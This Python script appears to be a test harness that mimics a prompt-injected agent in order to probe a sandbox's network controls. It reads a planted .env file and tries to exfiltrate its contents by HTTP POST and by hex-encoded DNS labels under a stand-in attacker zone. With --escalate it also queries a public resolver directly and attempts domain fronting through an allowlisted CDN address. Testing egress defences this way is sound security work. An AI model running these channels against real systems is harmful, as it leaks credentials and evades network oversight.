#!/usr/bin/env python3
"""A mock prompt-injected agent: it reads secrets from a planted .env and
tries to send them out over two channels.

  1. HTTP POST to an unlisted address (the "attacker" listener).
  2. DNS: the secret, hex-encoded, as labels of a query name, which a
     resolver would forward to the attacker's nameserver.

With --escalate it tries what a determined attacker would try next:

  3. the same DNS query sent straight to a public resolver, around the
     sandbox's own;
  4. domain fronting: TLS to the address of an allowlisted name (a shared
     CDN address) while asking for the attacker's name in the SNI.

It reports what happened on each channel and never raises.
"""

import argparse
import os
import socket
import ssl
import struct
import urllib.request


def dns_query(name):
    """A minimal DNS A query for name, as UDP payload."""
    header = struct.pack("!HHHHHH", int.from_bytes(os.urandom(2), "big"), 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    return header + qname + struct.pack("!HH", 1, 1)


def escalate(name, resolver, front):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(dns_query(name), (resolver, 53))
        s.recvfrom(512)
        print(f"agent: DNS query straight to {resolver} -> answered")
    except Exception as e:  # noqa: BLE001
        print(f"agent: DNS query straight to {resolver} failed: {e}")

    sni = name.split(".", 1)[1]
    try:
        addr = socket.gethostbyname(front)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((addr, 443), timeout=5) as raw:
            with ctx.wrap_socket(raw, server_hostname=sni):
                print(f"agent: TLS to {front}'s address {addr} with SNI {sni} -> connected")
    except Exception as e:  # noqa: BLE001
        print(f"agent: TLS to {front}'s address with SNI {sni} failed: {e}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--env", required=True, help="path to the planted .env")
    ap.add_argument("--url", required=True, help="exfiltration endpoint")
    ap.add_argument("--dns-zone", default="exfil.attacker.test")
    ap.add_argument("--escalate", action="store_true", help="try channels 3 and 4 instead")
    ap.add_argument("--resolver", default="8.8.8.8")
    ap.add_argument("--front", default="pypi.org", help="allowlisted name whose address to front through")
    args = ap.parse_args()

    with open(args.env, "rb") as f:
        secrets = f.read()
    print(f"agent: read {len(secrets)} bytes from {args.env}")
    label = secrets.hex()[:60]
    name = f"{label}.{args.dns_zone}"
    if args.escalate:
        escalate(name, args.resolver, args.front)
        return

    try:
        req = urllib.request.Request(args.url, data=secrets, method="POST")
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"agent: HTTP POST {args.url} -> {resp.status} {resp.read().decode().strip()!r}")
    except Exception as e:  # noqa: BLE001 - the demo reports every failure mode
        print(f"agent: HTTP POST {args.url} failed: {e}")

    try:
        addr = socket.gethostbyname(name)
        print(f"agent: DNS lookup of {name} -> {addr}")
    except Exception as e:  # noqa: BLE001
        print(f"agent: DNS lookup of {name} failed: {e}")


if __name__ == "__main__":
    main()
